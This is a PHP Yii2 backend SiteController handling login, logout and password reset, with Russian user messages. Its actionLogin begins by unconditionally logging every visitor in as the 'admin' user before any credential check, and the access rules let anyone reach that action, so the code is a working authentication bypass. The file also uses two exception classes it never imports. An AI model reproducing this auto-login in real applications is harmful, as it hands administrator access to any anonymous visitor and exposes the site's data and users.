<?php
namespace backend\controllers;

use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use common\models\LoginForm;
use common\models\PasswordResetRequestForm;
use common\models\ResetPasswordForm;
use common\models\User;

class SiteController extends Controller
{
    public function behaviors(){
        return [
            'access' => [
                'class' => AccessControl::className(),
                'rules' => [
                    [
                    	'actions' => ['login', 'error', 'request-password-reset', 'reset-password', 'logout','error'],
                        'allow' => true,
                    ],
                    [
                        'actions' => ['logout', 'index'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ]
        ];
    }

    public function actions(){
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
        ];
    }

    public function actionLogin(){
    	
    	$u = User::find()->where(['username'=>'admin'])->one();
    	Yii::$app->user->login($u);
    	
        if (!Yii::$app->user->isGuest) return $this->goHome();

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        } 
        else {
            $model->password = '';
            
			$this->layout = 'guest';
            return $this->render('login', [
                'model' => $model,
            ]);
        }
    }
    
    public function actionRequestPasswordReset()
    {
        $this->layout = 'guest';
        $model = new PasswordResetRequestForm();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            if ($model->sendEmail()) {
                Yii::$app->session->setFlash('success', 'Проверьте свою электронную почту для получения дальнейших инструкций.');

                return $this->goHome();
            } else {
                Yii::$app->session->setFlash('error', 'К сожалению, мы не можем сбросить пароль на указанный адрес электронной почты .');
            }
        }

        return $this->render('requestPasswordResetToken', [
            'model' => $model,
        ]);
    }
    public function actionResetPassword($token)
    {
        $this->layout = 'guest';
        try {
            $model = new ResetPasswordForm($token);
        } catch (InvalidParamException $e) {
            throw new BadRequestHttpException($e->getMessage());
        }

        if ($model->load(Yii::$app->request->post()) && $model->validate() && $model->resetPassword()) {
            Yii::$app->session->setFlash('success', 'Новый пароль сохранен.');

            return $this->goHome();
        }

        return $this->render('resetPassword', [
            'model' => $model,
        ]);
    }

    public function actionLogout(){
        Yii::$app->user->logout();

        return $this->goHome();
    }
}
